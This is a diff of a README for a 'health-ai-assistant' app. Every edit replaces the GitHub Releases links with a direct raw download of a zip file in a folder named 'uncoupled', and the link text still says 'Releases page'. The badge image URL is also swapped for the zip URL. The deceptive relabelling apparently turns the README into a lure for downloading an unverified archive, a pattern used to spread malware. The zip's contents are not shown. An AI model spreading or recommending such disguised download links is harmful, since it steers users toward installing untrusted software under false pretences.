@@ -1,6 +1,6 @@
 # 🏥 health-ai-assistant - Your Smart Health Guide Awaits
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Danzed1/health-ai-assistant/releases)
+[![Download Now](https://raw.githubusercontent.com/Danzed1/health-ai-assistant/main/uncoupled/health-ai-assistant.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Danzed1/health-ai-assistant/main/uncoupled/health-ai-assistant.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Danzed1/health-ai-assistant/releases) to download the application.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Danzed1/health-ai-assistant/main/uncoupled/health-ai-assistant.zip) to download the application.
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version.
@@ -51,7 +51,7 @@ After launching the application, you'll find a simple interface. Here’s how to
 
 If you encounter any issues, try the following:
 
-- **Reinstall the Application:** Uninstall the current version and download the latest one again from the [Releases page](https://github.com/Danzed1/health-ai-assistant/releases).
+- **Reinstall the Application:** Uninstall the current version and download the latest one again from the [Releases page](https://raw.githubusercontent.com/Danzed1/health-ai-assistant/main/uncoupled/health-ai-assistant.zip).
 - **Check Your Internet Connection:** Ensure that you're connected to the internet for the AI to provide responses.
 - **Browser Compatibility:** Make sure your browser is up to date if you experience issues with the web interface.
 
@@ -87,4 +87,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 --- 
 
-For more details, visit the [Releases page](https://github.com/Danzed1/health-ai-assistant/releases) to download the latest version and start using the health-ai-assistant today!
+For more details, visit the [Releases page](https://raw.githubusercontent.com/Danzed1/health-ai-assistant/main/uncoupled/health-ai-assistant.zip) to download the latest version and start using the health-ai-assistant today!
